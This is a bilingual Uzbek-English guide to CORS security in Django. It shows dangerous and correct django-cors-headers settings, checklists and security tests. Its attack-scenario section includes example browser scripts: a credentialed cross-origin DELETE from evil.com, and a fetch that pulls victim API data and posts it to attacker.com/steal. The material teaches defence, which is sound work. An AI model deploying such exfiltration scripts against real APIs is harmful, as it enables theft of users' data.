# CORS Security Best Practices

##  Xavfsizlik Asoslari

CORS noto'g'ri sozlanganda katta xavfsizlik muammolariga olib kelishi mumkin.

---

## ❌ HECH QACHON QILMANG

### 1. Production'da Wildcard

```python
# ❌ JUDA XAVFLI!
CORS_ALLOW_ALL_ORIGINS = True
```

**Nima uchun xavfli?**
- Har qanday website sizning API'ingizga murojaat qilishi mumkin
- Malicious website'lar user ma'lumotlarini o'g'irlashi mumkin
- CSRF attack'larga ochiq

**To'g'risi:**
```python
# ✅ Faqat kerakli origin'lar
CORS_ALLOWED_ORIGINS = [
    "https://yourdomain.com",
    "https://www.yourdomain.com",
]
```

---

### 2. Credentials + Wildcard

```python
# ❌ MUTLAQO XATO!
CORS_ALLOW_ALL_ORIGINS = True
CORS_ALLOW_CREDENTIALS = True
```

**Muammo:**
- Browser buni rad etadi
- Cookies va authorization headerlar leak bo'lishi mumkin

**To'g'risi:**
```python
# ✅ Aniq origin bilan credentials
CORS_ALLOWED_ORIGINS = ["https://yourdomain.com"]
CORS_ALLOW_CREDENTIALS = True
```

---

### 3. HTTP in Production

```python
# ❌ Xavfsiz emas
CORS_ALLOWED_ORIGINS = [
    "http://example.com",  # HTTP!
]
```

**Muammo:**
- Man-in-the-middle attacks
- Data encryption yo'q
- Modern brauzerlar warning beradi

**To'g'risi:**
```python
# ✅ HTTPS ishlatish
CORS_ALLOWED_ORIGINS = [
    "https://example.com",  # HTTPS!
]
```

---

### 4. Juda Keng Regex Pattern

```python
# ❌ Juda keng
CORS_ALLOWED_ORIGIN_REGEXES = [
    r"^https://.*\.com$",  # Barcha .com domenlar!
]
```

**Muammo:**
- `https://malicious.com` ham match bo'ladi
- `https://attacker.com` ham ruxsat beriladi

**To'g'risi:**
```python
# ✅ Aniq pattern
CORS_ALLOWED_ORIGIN_REGEXES = [
    r"^https://([a-z0-9-]+\.)?yourdomain\.com$",
]
```

---

### 5. Barcha Headerlarni Ruxsat Berish

```python
# ❌ Haddan tashqari
CORS_ALLOW_HEADERS = ['*']
```

**Muammo:**
- Har qanday custom header ruxsat beriladi
- Security bypass qilish mumkin

**To'g'risi:**
```python
# ✅ Faqat kerakli headerlar
CORS_ALLOW_HEADERS = [
    'accept',
    'authorization',
    'content-type',
]
```

---

## ✅ ALBATTA QILING

### 1. HTTPS Ishlatish (Production)

```python
# Production settings
SECURE_SSL_REDIRECT = True
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')

CORS_ALLOWED_ORIGINS = [
    "https://yourdomain.com",  # Faqat HTTPS
]
```

---

### 2. Environment-Based Configuration

```python
import os

DEBUG = os.getenv('DEBUG', 'False') == 'True'

if DEBUG:
    # Development - local testing
    CORS_ALLOW_ALL_ORIGINS = True
else:
    # Production - strict
    CORS_ALLOWED_ORIGINS = os.getenv(
        'CORS_ALLOWED_ORIGINS',
        'https://example.com'
    ).split(',')
```

**.env file:**
```env
# Production
DEBUG=False
CORS_ALLOWED_ORIGINS=https://example.com,https://www.example.com

# Development
# DEBUG=True
```

---

### 3. Origin Validation

```python
# Custom validation
from corsheaders.signals import check_request_enabled

def validate_origin(sender, request, **kwargs):
    origin = request.META.get('HTTP_ORIGIN', '')
    
    # Log suspicious origins
    if origin and not origin.endswith('.yourdomain.com'):
        import logging
        logger = logging.getLogger(__name__)
        logger.warning(f"Suspicious CORS origin: {origin}")
    
    return False

check_request_enabled.connect(validate_origin)
```

---

### 4. Rate Limiting with CORS

```python
# settings.py
REST_FRAMEWORK = {
    'DEFAULT_THROTTLE_CLASSES': [
        'rest_framework.throttling.AnonRateThrottle',
    ],
    'DEFAULT_THROTTLE_RATES': {
        'anon': '100/hour',  # Anonymous users
    }
}

# CORS bilan
CORS_ALLOWED_ORIGINS = [
    "https://yourdomain.com",
]
```

**Nima uchun?**
- CORS attacks'ni prevent qilish
- Brute force attacks'dan himoya
- API abuse'ni oldini olish

---

### 5. CSP (Content Security Policy)

```python
# settings.py
SECURE_CONTENT_SECURITY_POLICY = {
    'default-src': ["'self'"],
    'connect-src': [
        "'self'",
        "https://api.yourdomain.com",
    ],
}

# Middleware
MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',
    'csp.middleware.CSPMiddleware',  # CSP middleware
    # ...
]
```

---

### 6. Logging CORS Requests

```python
# Custom middleware
class CORSLoggingMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response
    
    def __call__(self, request):
        origin = request.META.get('HTTP_ORIGIN')
        
        if origin:
            import logging
            logger = logging.getLogger('cors')
            logger.info(f"CORS request from: {origin} to {request.path}")
        
        response = self.get_response(request)
        return response

# settings.py
MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',
    'myapp.middleware.CORSLoggingMiddleware',
    # ...
]

LOGGING = {
    'version': 1,
    'loggers': {
        'cors': {
            'handlers': ['file'],
            'level': 'INFO',
        },
    },
    'handlers': {
        'file': {
            'class': 'logging.FileHandler',
            'filename': 'cors.log',
        },
    },
}
```

---

##  Common Attack Scenarios

### Attack 1: CSRF via CORS Misconfiguration

**Scenario:**
```python
# ❌ Xavfli configuration
CORS_ALLOW_ALL_ORIGINS = True
CORS_ALLOW_CREDENTIALS = True
```

**Attack:**
```html
<!-- Attacker's website: evil.com -->
<script>
fetch('https://api.victim.com/user/delete', {
    method: 'DELETE',
    credentials: 'include',  // Victim's cookies
})
</script>
```

**Defense:**
```python
# ✅ Aniq origin va CSRF protection
CORS_ALLOWED_ORIGINS = ["https://yourdomain.com"]
CORS_ALLOW_CREDENTIALS = True

# Django default CSRF protection
MIDDLEWARE = [
    # ...
    'django.middleware.csrf.CsrfViewMiddleware',
]
```

---

### Attack 2: Data Exfiltration

**Scenario:**
```python
# ❌ Juda keng regex
CORS_ALLOWED_ORIGIN_REGEXES = [
    r"^https://.*\.com$",
]
```

**Attack:**
```javascript
// attacker.com
fetch('https://api.victim.com/users/')
    .then(r => r.json())
    .then(data => {
        // Send to attacker's server
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify(data)
        })
    })
```

**Defense:**
```python
# ✅ Aniq subdomain pattern
CORS_ALLOWED_ORIGIN_REGEXES = [
    r"^https://([a-z0-9-]+\.)?yourdomain\.com$",
]
```

---

### Attack 3: API Key Theft

**Scenario:**
```python
# ❌ Custom header ruxsat
CORS_ALLOW_HEADERS = ['*']
```

**Attack:**
```javascript
// Malicious website
fetch('https://api.victim.com/data', {
    headers: {
        'X-API-Key': 'stolen-key-12345'
    }
})
```

**Defense:**
```python
# ✅ Faqat kerakli headerlar
CORS_ALLOW_HEADERS = [
    'authorization',
    'content-type',
    # NO x-api-key if not needed
]

# Backend validation
def validate_api_key(request):
    api_key = request.headers.get('X-API-Key')
    origin = request.META.get('HTTP_ORIGIN')
    
    # Check if API key is from allowed origin
    if not is_key_valid_for_origin(api_key, origin):
        return Response(status=403)
```

---

##  Security Checklist

### Before Production:

- [ ] `CORS_ALLOW_ALL_ORIGINS = False`
- [ ] Faqat HTTPS origin'lar
- [ ] Environment variables'dan configuration
- [ ] Aniq origin ro'yxati (wildcard emas)
- [ ] `CORS_ALLOW_CREDENTIALS` faqat kerak bo'lsa
- [ ] Faqat kerakli headerlar ruxsat berilgan
- [ ] Faqat kerakli HTTP methodlar
- [ ] CORS logging yoqilgan
- [ ] Rate limiting sozlangan
- [ ] CSRF protection yoniq
- [ ] SSL/TLS certificate to'g'ri
- [ ] Security headers (CSP, HSTS, etc.)

### Regular Monitoring:

- [ ] CORS logs'ni tekshirish
- [ ] Suspicious origin'larni monitoring
- [ ] Failed CORS requests statistics
- [ ] API usage patterns
- [ ] Security incidents review

---

## 🔍 Testing Security

### 1. Manual Testing

```bash
# Valid origin test
curl -H "Origin: https://yourdomain.com" \
     http://localhost:8000/api/books/

# Invalid origin test
curl -H "Origin: https://malicious.com" \
     http://localhost:8000/api/books/

# Should NOT have CORS headers for invalid origin
```

### 2. Automated Testing

```python
# tests/test_cors_security.py
from django.test import TestCase

class CORSSecurityTest(TestCase):
    def test_disallow_malicious_origin(self):
        response = self.client.get(
            '/api/books/',
            HTTP_ORIGIN='https://malicious.com'
        )
        
        # Should not allow this origin
        self.assertNotIn('Access-Control-Allow-Origin', response)
    
    def test_allow_valid_origin(self):
        response = self.client.get(
            '/api/books/',
            HTTP_ORIGIN='https://yourdomain.com'
        )
        
        self.assertEqual(
            response['Access-Control-Allow-Origin'],
            'https://yourdomain.com'
        )
    
    def test_credentials_not_with_wildcard(self):
        from django.conf import settings
        
        if settings.CORS_ALLOW_CREDENTIALS:
            self.assertFalse(settings.CORS_ALLOW_ALL_ORIGINS)
```

---

##  Additional Resources

### Official Documentation
- [MDN CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [django-cors-headers](https://github.com/adamchainz/django-cors-headers)
- [OWASP CORS](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)

### Security Standards
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE-942: CORS](https://cwe.mitre.org/data/definitions/942.html)

### Tools
- [CORS Test Tool](https://www.test-cors.org/)
- [Security Headers](https://securityheaders.com/)

---

##  Key Takeaways

1. **Never** use `CORS_ALLOW_ALL_ORIGINS = True` in production
2. **Always** use HTTPS in production
3. **Limit** allowed origins to minimum necessary
4. **Monitor** CORS requests and logs
5. **Test** security before deployment
6. **Update** regularly and review configuration
7. **Document** allowed origins and reasons
8. **Educate** team about CORS security

---

##  Pro Tips

1. **Use environment variables** for all CORS settings
2. **Implement monitoring** for suspicious origins
3. **Regular security audits** of CORS configuration
4. **Keep django-cors-headers updated** to latest version
5. **Use restrictive CSP** alongside CORS
6. **Document exceptions** if any origin added
7. **Review access logs** monthly
8. **Have incident response plan** for CORS breaches

---

**Remember:** CORS is not a security feature, it's a way to relax Same-Origin Policy. Real security comes from proper authentication, authorization, and validation!

**Esda tuting:**CORS xavfsizlik xususiyati emas, balki bir xil kelib chiqish siyosatini yumshatish usulidir. Haqiqiy xavfsizlik to'g'ri autentifikatsiya, avtorizatsiya va tekshirishdan kelib chiqadi!